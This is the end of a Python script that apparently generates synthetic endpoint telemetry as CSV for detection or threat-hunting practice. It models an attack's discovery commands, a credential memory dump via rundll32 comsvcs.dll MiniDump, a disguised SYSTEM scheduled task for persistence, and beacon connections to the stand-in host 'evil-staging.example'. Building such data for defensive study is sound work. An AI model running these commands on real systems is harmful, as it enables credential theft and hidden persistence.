    # Same kill chain replays on legal host — discovery, dump, persistence
    for fn, cmd, sha in [
        ('whoami.exe',  'whoami.exe /all',                       H['whoami.exe']),
        ('nltest.exe',  'nltest.exe /domain_trusts',             H['nltest.exe']),
        ('net.exe',     'net.exe group "Domain Admins" /domain', H['net.exe']),
        ('rundll32.exe',
            'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 716 '
            'C:\\Users\\smith\\AppData\\Local\\Temp\\out.bin full',
            H['rundll32.exe']),
        ('schtasks.exe',
            'schtasks.exe /create /tn "WindowsUpdateCheck" '
            '/tr "C:\\Users\\smith\\AppData\\Local\\Temp\\s2.ps1" '
            '/sc onlogon /ru SYSTEM /f', H['schtasks.exe']),
    ]:
        rows.append(row(ctx.t(sec=20), 'WS-LEGAL-12', 'ProcessCreated',
                        fn, r'C:\Windows\System32', cmd, sha, 'smith',
                        'powershell.exe', f'powershell.exe {ENC_PS}',
                        legal_ps_pid, 'smith', ctx.pid(), rpt=ctx.r()))

    # More beacon callbacks on legal host
    for _ in range(3):
        rows.append(row(ctx.t(min=4), 'WS-LEGAL-12', 'NetworkConnectionEvents',
                        'powershell.exe',
                        r'C:\Windows\System32\WindowsPowerShell\v1.0',
                        f'powershell.exe {ENC_PS}', H['powershell.exe'],
                        'smith', 'powershell.exe',
                        f'powershell.exe {ENC_PS}', legal_ps_pid, 'smith',
                        legal_ps_pid, rip=C2_PRIMARY,
                        rurl='evil-staging.example', rport='443', rpt=ctx.r()))

    return rows


HEADERS = ['Timestamp', 'DeviceName', 'ActionType', 'FileName', 'FolderPath',
           'ProcessCommandLine', 'SHA256', 'AccountName',
           'InitiatingProcessFileName', 'InitiatingProcessCommandLine',
           'InitiatingProcessId', 'InitiatingProcessAccountName', 'ProcessId',
           'RemoteIP', 'RemoteUrl', 'RemotePort', 'ReportId']


def main():
    w = csv.writer(sys.stdout)
    w.writerow(HEADERS)
    for r in build_rows():
        w.writerow(r)


if __name__ == '__main__':
    main()
